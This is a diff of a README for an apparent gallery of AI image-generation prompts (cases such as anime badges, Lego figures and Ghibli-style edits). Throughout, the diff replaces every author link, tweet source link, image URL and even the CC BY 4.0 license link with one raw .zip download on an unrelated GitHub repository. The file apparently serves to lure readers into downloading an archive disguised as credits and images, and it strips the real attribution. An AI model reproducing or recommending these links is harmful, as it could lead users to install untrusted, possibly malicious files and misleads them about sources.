+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@Gdgtify</a></sub>
 
 **Prompt**
 
@@ -2524,14 +2524,14 @@ Retro CRT computer boot screen that resolves into ASCII-art of [shape or logo]
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-16"></a>
-### Case 16: Anime-style Badge (by [@Alittlefatwhale](https://x.com/Alittlefatwhale))
+### Case 16: Anime-style Badge (by [@Alittlefatwhale](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/Alittlefatwhale/status/1922512847030124905)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-Ca-5YJ46y4a9sscNaxYEu.png?v=1" width="300" alt="Art Style: 二次元风格徽章 (Gemini Example 16) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/16/anime_style_badge.png" width="300" alt="Art Style: 二次元风格徽章 (Gemini Example 16) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/Alittlefatwhale">@Alittlefatwhale</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 二次元风格徽章 (Gemini Example 16) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 二次元风格徽章 (Gemini Example 16) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@Alittlefatwhale</a></sub>
 
 **Prompt**
 
@@ -2551,14 +2551,14 @@ Main subject: A hand holding the badge
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-15"></a>
-### Case 15: Satirical Poster Generation (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 15: Satirical Poster Generation (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1905287637084274742)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-xGmNg1hgJY0uyFt3rz2cK.png?v=1" width="300" alt="Design: 讽刺海报生成 (Gemini Example 15) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/15/example_gpt_involution_poster.png" width="300" alt="Design: 讽刺海报生成 (Gemini Example 15) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 讽刺海报生成 (Gemini Example 15) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 讽刺海报生成 (Gemini Example 15) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2577,14 +2577,14 @@ maybe it’s time to deliver takeout instead.
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-14"></a>
-### Case 14: One Piece Themed Figure Creation (by [@dotey](https://x.com/dotey))
+### Case 14: One Piece Themed Figure Creation (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1909047547563213145)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-NvCTQQUq05OW6oKH5qwRq.png?v=1" width="300" alt="Character: 《海贼王》主题手办制作 (Gemini Example 14) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/14/example_one_piece_figure_creation.png" width="300" alt="Character: 《海贼王》主题手办制作 (Gemini Example 14) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 《海贼王》主题手办制作 (Gemini Example 14) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 《海贼王》主题手办制作 (Gemini Example 14) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2604,14 +2604,14 @@ Next to the box, include a realistic, fully rendered version of the actual figur
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-13"></a>
-### Case 13: Photo to 3D Q-version Style (by [@dotey](https://x.com/dotey))
+### Case 13: Photo to 3D Q-version Style (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1908194518345678865)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-DT8wukx2fHHcrxXQosaRL.png?v=1" width="300" alt="Character: 3D Q版风格 (Gemini Example 13) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/13/example_photo_to_3d_q.png" width="300" alt="Character: 3D Q版风格 (Gemini Example 13) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版风格 (Gemini Example 13) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版风格 (Gemini Example 13) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2628,14 +2628,14 @@ Transform the characters in the scene into 3D chibi-style figures, while keeping
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-12"></a>
-### Case 12: 3D Couple Jewelry Box Figurine (by [@dotey](https://x.com/dotey))
+### Case 12: 3D Couple Jewelry Box Figurine (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1909332895115714835)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-YWXXlSDRM9VTziQ-IA2WS.png?v=1" width="300" alt="Character: 3D 情侣珠宝盒摆件 (Gemini Example 12) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/12/example_3d_collectible_couple_box.png" width="300" alt="Character: 3D 情侣珠宝盒摆件 (Gemini Example 12) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D 情侣珠宝盒摆件 (Gemini Example 12) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D 情侣珠宝盒摆件 (Gemini Example 12) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2662,14 +2662,14 @@ Aspect ratio: 9:16
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-11"></a>
-### Case 11: PS2 Game Cover (GTA x Shrek) (by [@dotey](https://x.com/dotey))
+### Case 11: PS2 Game Cover (GTA x Shrek) (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1904978767090524372)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-qVK6fm-fP8a4-grand.jpeg" width="300" alt="Gaming: PS2 游戏封面 (GTA x Shrek) (Gemini Example 11) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/11/example_ps2_gta_shrek.png" width="300" alt="Gaming: PS2 游戏封面 (GTA x Shrek) (Gemini Example 11) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Gaming: PS2 游戏封面 (GTA x Shrek) (Gemini Example 11) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Gaming: PS2 游戏封面 (GTA x Shrek) (Gemini Example 11) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2685,14 +2685,14 @@ Can you create a PS2 video game case of "Grand Theft Auto: Far Far Away" a GTA b
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-10"></a>
-### Case 10: Satirical Cartoon Generation (by [@dotey](https://x.com/dotey))
+### Case 10: Satirical Cartoon Generation (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1910514811756065159)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-Z83GBoUT3DwcvoN5sHm0s.png?v=1" width="300" alt="Art Style: 讽刺漫画生成 (Gemini Example 10) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/10/example_maga_hat_cartoon.png" width="300" alt="Art Style: 讽刺漫画生成 (Gemini Example 10) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 讽刺漫画生成 (Gemini Example 10) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 讽刺漫画生成 (Gemini Example 10) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2710,14 +2710,14 @@ The composition is exaggerated and satirical, carrying a strong critique of poli
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-9"></a>
-### Case 9: Minimalist Futurist Poster (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 9: Minimalist Futurist Poster (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1921906728763105394)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-DtLAhr11gXRLHpr6gewDw.png?v=1" width="300" alt="Design: 极简未来主义海报 (Gemini Example 9) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/9/minimalist_futurist_poster.png" width="300" alt="Design: 极简未来主义海报 (Gemini Example 9) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 极简未来主义海报 (Gemini Example 9) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 极简未来主义海报 (Gemini Example 9) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2745,14 +2745,14 @@ The overall layout is clean with generous whitespace, balanced composition, shar
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-8"></a>
-### Case 8: Lego Collectible Figure (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 8: Lego Collectible Figure (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1910644499354968091)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini--GfTzdWQbEMLDiJiRLZ0T.png?v=1" width="300" alt="Art Style: 乐高收藏品 (Gemini Example 8) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/8/example_lego_collectible.png" width="300" alt="Art Style: 乐高收藏品 (Gemini Example 8) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 乐高收藏品 (Gemini Example 8) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 乐高收藏品 (Gemini Example 8) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2777,14 +2777,14 @@ Balance is key to the layout. The background should feature a smooth gradient tr
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-7"></a>
-### Case 7: Personalized Room Design (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 7: Personalized Room Design (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1910698005193515370)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-gjew3NuDghjCdTN4hNcAd.png?v=1" width="300" alt="Personalized Room Design - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/7/example_personalized_room.png" width="300" alt="Personalized Room Design - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Personalized Room Design - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Personalized Room Design - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -2801,14 +2801,14 @@ Design a cozy bedroom in a cute 3D style with C4D-quality rendering, presented i
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-6"></a>
-### Case 6: Character Stepping Through Portal (by [@dotey](https://x.com/dotey))
+### Case 6: Character Stepping Through Portal (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1908910838636765204)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-_NKwGXWrnvn2lkTyd9BcW.png?v=1" width="300" alt="Character Through Portal - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/6/example_portal_crossing_handhold.png" width="300" alt="Character Through Portal - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character Through Portal - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character Through Portal - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -2828,14 +2828,14 @@ The scene is captured from a third-person perspective, clearly showing the viewe
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-5"></a>
-### Case 5: Ghibli Style (by [AnimeAI](https://animeai.online))
+### Case 5: Ghibli Style (by [AnimeAI](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://animeai.online/#demo-gallery)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-X0RI3ZzR8ycbFfn-1fHDY.png?v=1" width="300" alt="Ghibli Style - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/5/ghibli-style-mona-lisa.png" width="300" alt="Ghibli Style - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://animeai.online">AnimeAI</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Ghibli Style - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Ghibli Style - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">AnimeAI</a></sub>
 
 **Prompt**
 
@@ -2853,14 +2853,14 @@ Redraw this photo in Ghibli style
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-4"></a>
-### Case 4: 3D Chibi Chinese Wedding Scene (by [@balconychy](https://x.com/balconychy))
+### Case 4: 3D Chibi Chinese Wedding Scene (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1909418699150237917)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-xLsI7aK4zyVWcRwJ46a2E.png?v=1" width="300" alt="Q Version Chinese Wedding - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/4/example_q_chinese_wedding.png" width="300" alt="Q Version Chinese Wedding - GPT-4o"> |
